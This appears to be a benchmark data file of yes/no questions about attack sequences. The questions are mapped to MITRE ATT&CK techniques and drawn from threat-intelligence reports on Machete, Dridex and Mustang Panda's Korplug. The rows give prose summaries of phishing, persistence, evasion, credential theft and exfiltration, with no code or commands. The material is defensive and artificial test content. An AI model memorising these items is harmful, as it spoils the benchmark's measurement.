2626,6,6-Discovery-T1010-Application Window Discovery,"After employing spearphishing emails with legitimate-looking decoy documents for initial access and executing a self-extracting downloader to install backdoor components, is Machete likely to use the netsh command to list nearby Wi-Fi networks and report window names during its discovery phase before stealing clipboard contents and capturing screenshots as part of its data collection activities?","Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2627,6,6-Discovery-T1120-Peripheral Device Discovery,"After using spearphishing emails with malicious compressed files to gain initial access to victim systems, is it likely that Machete malware will list all nearby Wi-Fi networks using the netsh command before copying files from local systems and removable media for collection?","Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2630,6,6-Credential Access-T1555-Credentials from Password Stores,"Following the discovery activities where Machete enumerates running processes and gathers browser data such as bookmarks and stored credentials, is it likely that the malware will target and exfiltrate credentials from password stores before collecting files by copying them from local systems and removable media?",Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.,"Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2633,6,6-Collection-T1025-Data from Removable Media,"After conducting discovery by listing nearby Wi-Fi networks and enumerating running processes, is Machete likely to collect data by copying files from removable media before staging the collected data in a temporary folder where files and logs are encrypted?","Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2635,6,6-Collection-T1113-Screen Capture,"After the Machete malware performs discovery by detecting newly inserted devices, producing file listings for exfiltration, and gathering browser data, is it likely to utilize screen capture as part of data collection before leveraging FTP and HTTP ports for communication with its C2 servers?","Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2636,6,6-Collection-T1074-Data Staged,"After conducting discovery activities such as listing nearby Wi-Fi networks using the netsh command and enumerating running processes to identify browsers, is it likely that Machete will stage collected data in a temporary folder with encrypted files and logs before automatically exfiltrating it to remote servers using AES encryption and base64 encoding?","Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2637,6,6-Collection-T1560-Archive Collected Data,"After enumerating browser data such as bookmarks and reporting window names during discovery, is Machete likely to stage encrypted files and logs in a temporary folder for collection before using Command and Control channels like FTP and HTTP for communication with its servers?","Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2638,6,6-Exfiltration-T1020-Automated Exfiltration,"After Machete collected data by stealing clipboard contents, capturing screenshots, and logging keystrokes, is it likely that the malware used FTP and HTTP ports for communication with its command and control servers before exfiltrating encrypted data to remote servers?","Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.",Yes,ESET_Machete
2639,6,6-Exfiltration-T1041-Exfiltration Over C2 Channel,"After stealing clipboard contents, capturing screenshots, and staging encrypted data in a temporary folder, is Machete likely to automatically exfiltrate all collected files to remote servers and the C&C server using encrypted and compressed transmission methods?","Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.",Yes,ESET_Machete
2641,6,6-Exfiltration-T1052-Exfiltration Over Physical Medium,"After Machete uses FTP and HTTP to communicate with its C&C servers and optionally downloads additional files for execution as part of its command and control activities, is it likely to automatically copy data from all drives in a compromised system to a removable drive if a specific file is present on that drive during its exfiltration phase?","Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.",Yes,ESET_Machete
2643,60,60-Execution-T1106-Native API,"After malicious documents attached to emails execute embedded macros to download the Dridex loader, is it likely that the loader will execute the OutputDebugStringW function as part of its anti-debugging techniques before employing RC4 encryption to obfuscate strings and evade detection?","Execution: The Dridex malware consists of a loader and a payload. The loader employs the OutputDebugStringW function as an anti-debug technique, producing numerous debug messages to complicate analysis. The payload is heavily obfuscated, with no function called directly. Call resolutions are performed using hash values, and strings within the malware are obfuscated using the RC4 algorithm.","Initial Access: The CTI report details the initial access tactics employed by the Dridex malware, which is spread using established spambots from different cyber-crime groups. These spambots send malicious documents attached to emails, which when opened by the user, execute embedded macros designed to download and execute the Dridex payload. The spambots involved in spreading Dridex have included Necurs, Cutwail, and Andromeda at different times.
Defense Evasion: Dridex employs anti-debug techniques and obfuscation to evade detection. The loader uses the OutputDebugStringW function to generate a large number of debug messages, creating a loop with around 200 million iterations. The payload uses hash values for call resolutions and RC4 encryption for string obfuscation, making direct function calls and strings within the malware difficult to analyze.
Command and Control: Dridex communicates with its command and control (C&C) servers by sending encrypted POST requests containing data such as the computer name, botnet ID number, type of request, OS architecture, and list of installed software. The C&C servers listed in the malware's configuration are not the actual servers but proxies for connecting to the real ones.
Others: The CTI report provides a comprehensive background on the Dridex malware, including its evolution from the ZeuS malware and its association with the cyber-crime group Evil Corp. It also details the infection chain, targets, lures, and initial detection rate of Dridex delivery files. Additionally, the report includes information on the network activity of Dridex, the use of IP addresses to map the malware's network, and the detection of Dridex spikes, indicating successful interception of the malware at early stages. The report concludes with a list of indicators linked to Dridex, such as domains, IP addresses, URLs, and hashes of malicious documents and malware samples.",Yes,research.checkpoint.com-Stopping Serial Killer Catching the Next Strike
2648,60,60-Command and Control-T1090-Proxy,"After employing anti-debug techniques and obfuscation loops for defense evasion, is it likely that Dridex malware will send encrypted POST requests containing data like the computer name and botnet ID to connect to proxy servers used for command and control?","Command and Control: Dridex communicates with its command and control (C&C) servers by sending encrypted POST requests containing data such as the computer name, botnet ID number, type of request, OS architecture, and list of installed software. The C&C servers listed in the malware's configuration are not the actual servers but proxies for connecting to the real ones.","Initial Access: The CTI report details the initial access tactics employed by the Dridex malware, which is spread using established spambots from different cyber-crime groups. These spambots send malicious documents attached to emails, which when opened by the user, execute embedded macros designed to download and execute the Dridex payload. The spambots involved in spreading Dridex have included Necurs, Cutwail, and Andromeda at different times.
Execution: The Dridex malware consists of a loader and a payload. The loader employs the OutputDebugStringW function as an anti-debug technique, producing numerous debug messages to complicate analysis. The payload is heavily obfuscated, with no function called directly. Call resolutions are performed using hash values, and strings within the malware are obfuscated using the RC4 algorithm.
Defense Evasion: Dridex employs anti-debug techniques and obfuscation to evade detection. The loader uses the OutputDebugStringW function to generate a large number of debug messages, creating a loop with around 200 million iterations. The payload uses hash values for call resolutions and RC4 encryption for string obfuscation, making direct function calls and strings within the malware difficult to analyze.
Others: The CTI report provides a comprehensive background on the Dridex malware, including its evolution from the ZeuS malware and its association with the cyber-crime group Evil Corp. It also details the infection chain, targets, lures, and initial detection rate of Dridex delivery files. Additionally, the report includes information on the network activity of Dridex, the use of IP addresses to map the malware's network, and the detection of Dridex spikes, indicating successful interception of the malware at early stages. The report concludes with a list of indicators linked to Dridex, such as domains, IP addresses, URLs, and hashes of malicious documents and malware samples.",Yes,research.checkpoint.com-Stopping Serial Killer Catching the Next Strike
2651,61,61-Defense Evasion-T1574-Hijack Execution Flow,"After Mustang Panda delivers a downloader with filenames linked to current events to open a decoy document and gain initial access, is it likely that the group will execute the Korplug malware through a DLL side-loading vulnerability before engaging in control-flow obfuscation for defense evasion?","Defense Evasion: Mustang Panda's campaign features heavy use of control-flow obfuscation and anti-analysis techniques at every stage of the deployment process. The downloader and loader use various methods to obfuscate the control flow, including junk code, opaque predicates, and encrypted stack strings. The Korplug file is encrypted and only decrypted at runtime, and its configuration data is encrypted with XOR. The directories created during the installation process are set as hidden system directories, and the malware can run commands on a hidden desktop.","Resource Development: ESET researchers discovered an ongoing campaign by Mustang Panda using a new Korplug variant named Hodur, which has been active since at least August 2021. The campaign targets research entities, internet service providers, and European diplomatic missions, leveraging current events in Europe, such as Russia's invasion of Ukraine, to lure victims with phishing documents. The group behind the campaign, attributed to Mustang Panda (also known as TA416, RedDelta, or PKPLUG), is known for targeting governmental entities and NGOs, primarily in East and Southeast Asia, with a focus on Mongolia. They have also targeted the Vatican in 2020. The campaign uses custom loaders for shared malware like Cobalt Strike, Poison Ivy, and Korplug, and is characterized by the use of anti-analysis techniques and control-flow obfuscation at every stage of the deployment process.
Initial Access: The initial access vector is not explicitly observed but is believed to involve phishing and watering hole attacks. The campaign uses filenames related to current events, such as 'COVID-19 travel restrictions EU reviews list of third countries.exe' and 'Situation at the EU borders with Ukraine.exe', to deliver a downloader that also opens a decoy document to distract the victim. These documents are often legitimate and publicly accessible, reflecting the filenames used.
Execution: Mustang Panda's campaign utilizes a custom loader to execute the new Korplug variant. The loader is a DLL that exploits a side-loading vulnerability in a legitimate, signed executable. The loader exports multiple functions, but only one function is responsible for loading the final malware stage. The loader function decrypts the encrypted Korplug file in memory and makes the buffer executable before calling into it.
Persistence: The Korplug variant establishes persistence by creating a directory under %allusersprofile%, marking it as hidden and system, and copying the necessary files to this directory. It then sets up persistence either by creating a scheduled task to run at boot or by adding a registry entry to Software\Microsoft\Windows\CurrentVersion\Run. The malware launches the executable from its new location and exits.
Discovery: The Korplug variant collects extensive information about the system, including uptime, Windows version, CPU clock rate, amount of RAM, and display resolution. It also retrieves the system locale, hostname, and IP addresses, and uses GetSystemTime to retrieve the current system time.
Collection: Korplug collects data from the local system, removable media, and network shared drives. It can list files and directories along with their attributes and content, and collects metadata and content from all mapped drives.
Command and Control: Korplug communicates with C&C servers using a custom TCP-based protocol. The initial handshake can be done over HTTPS or TCP, and subsequent communication is always done over TCP. The communication is encrypted using RC4 and may use non-standard ports. The configuration contains fallback C&C servers, and Korplug can download additional files from the C&C server.
Exfiltration: Data exfiltration is performed via the same custom protocol used to send and receive commands, involving TCP messages with a header followed by a compressed and encrypted message body.
Others: The campaign uses filenames that reflect current events to lure victims, demonstrating Mustang Panda's ability to quickly react to world events. The group iteratively improves its tools, including the use of trident downloaders to deploy Korplug. ESET Research offers private APT intelligence reports and data feeds, and inquiries can be directed to threatintel@eset.com.",Yes,"Mustang Panda’s Hodur_ Old tricks, new Korplug variant _ WeLiveSecurity"
2652,61,61-Discovery-T1082-System Information Discovery,"After establishing persistence by creating a scheduled task or registry entry to run the executable from a hidden system directory, is the Korplug variant likely to collect system information such as uptime, Windows version, and CPU clock rate before using a custom TCP-based protocol to communicate with Command and Control (C&C) servers?","Discovery: The Korplug variant collects extensive information about the system, including uptime, Windows version, CPU clock rate, amount of RAM, and display resolution. It also retrieves the system locale, hostname, and IP addresses, and uses GetSystemTime to retrieve the current system time.","Resource Development: ESET researchers discovered an ongoing campaign by Mustang Panda using a new Korplug variant named Hodur, which has been active since at least August 2021. The campaign targets research entities, internet service providers, and European diplomatic missions, leveraging current events in Europe, such as Russia's invasion of Ukraine, to lure victims with phishing documents. The group behind the campaign, attributed to Mustang Panda (also known as TA416, RedDelta, or PKPLUG), is known for targeting governmental entities and NGOs, primarily in East and Southeast Asia, with a focus on Mongolia. They have also targeted the Vatican in 2020. The campaign uses custom loaders for shared malware like Cobalt Strike, Poison Ivy, and Korplug, and is characterized by the use of anti-analysis techniques and control-flow obfuscation at every stage of the deployment process.
Initial Access: The initial access vector is not explicitly observed but is believed to involve phishing and watering hole attacks. The campaign uses filenames related to current events, such as 'COVID-19 travel restrictions EU reviews list of third countries.exe' and 'Situation at the EU borders with Ukraine.exe', to deliver a downloader that also opens a decoy document to distract the victim. These documents are often legitimate and publicly accessible, reflecting the filenames used.
Execution: Mustang Panda's campaign utilizes a custom loader to execute the new Korplug variant. The loader is a DLL that exploits a side-loading vulnerability in a legitimate, signed executable. The loader exports multiple functions, but only one function is responsible for loading the final malware stage. The loader function decrypts the encrypted Korplug file in memory and makes the buffer executable before calling into it.
